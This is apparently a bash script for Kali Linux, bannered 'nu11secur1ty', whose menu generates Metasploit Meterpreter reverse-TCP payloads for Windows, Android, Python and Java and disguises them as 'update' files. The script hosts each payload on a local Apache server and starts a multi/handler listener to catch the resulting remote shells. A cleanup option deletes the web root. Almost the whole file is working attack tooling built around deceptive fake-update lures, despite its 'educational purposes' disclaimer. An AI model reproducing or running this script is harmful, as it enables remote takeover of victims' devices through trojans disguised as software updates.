#!/usr/bin/bash
# nu11secur1ty mode
# version Shimazu 4.0
i="0"
resize -s 25 80
	clear
while [ $i -lt 1 ]
	do
		clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
#ip=$(ip addr show eth0 | awk '/inet / {print $2}' | cut -d/ -f 1)

echo -e '\e[1;18m

 :::::::: :::    ::::::::::::::::::    ::::     :::    ::::::::::::    ::: 
:+:    :+::+:    :+:    :+:    +:+:+: :+:+:+  :+: :+:       :+: :+:    :+: 
+:+       +:+    +:+    +:+    +:+ +:+:+ +:+ +:+   +:+     +:+  +:+    +:+ 
+#++:++#+++#++:++#++    +#+    +#+  +:+  +#++#++:++#++:   +#+   +#+    +:+ 
       +#++#+    +#+    +#+    +#+       +#++#+     +#+  +#+    +#+    +#+ 
#+#    #+##+#    #+#    #+#    #+#       #+##+#     #+# #+#     #+#    #+# 
######## ###    #################       ######     ############ ######## 
					For	(Kali Linux)
 						\e[1;34m
					by nu11secur1ty
                           
     Usage of ONLY FOR EDUCATIONAL PURPOSES!!! STAY LEGAL!!!
                                                \e[1;23m
If you do not want to use the program, please press Ctrl+C to exit.

---------------------------------------------------------------------------
[1] Windows - update.exe [payload and listener] 
[2] Android - update.apk [payload and listener]  
[3] Linux   - update.py  [payload and listener] 
[4] MacOS   - update.jar [payload and listener]
[5]         - Cleaning
'

service postgresql start
#systemctl start apache2.service

exe='1'
apk='2'
py='3'
jar='4' 
cl='5'

read x

# 1
if [ "$x" == "$exe" ]; then                    
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > /root/Desktop/update.exe
	mv /root/Desktop/update.exe /var/www/html
	systemctl start apache2.service
echo -e 'Waiting for listener...'
msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
# 2
elif [ "$x" == "$apk" ]; then                          
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.apk
	mv /root/Desktop/update.apk /var/www/html
	systemctl start apache2.service
echo -e 'Waiting for listener...'
msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
# 3
elif [ "$x" == "$py" ]; then                       
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
	mv /root/Desktop/update.py /var/www/html
	systemctl start apache2.service
echo -e 'Waiting for listener...'
msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
# 4
elif [ "$x" == "$jar" ]; then                        
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/update.jar
	mv /root/Desktop/update.jar /var/www/html
	systemctl start apache2.service
echo -e 'Waiting for listener...'
msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

# 5	
elif [ "$x" == "$cl" ]; then
	echo "Wait to clean..."
		sleep 3;
		systemctl stop apache2.service	
		rm -rf /var/www/html/*
		echo "Erverything is cleaning ;)"
	fi
done
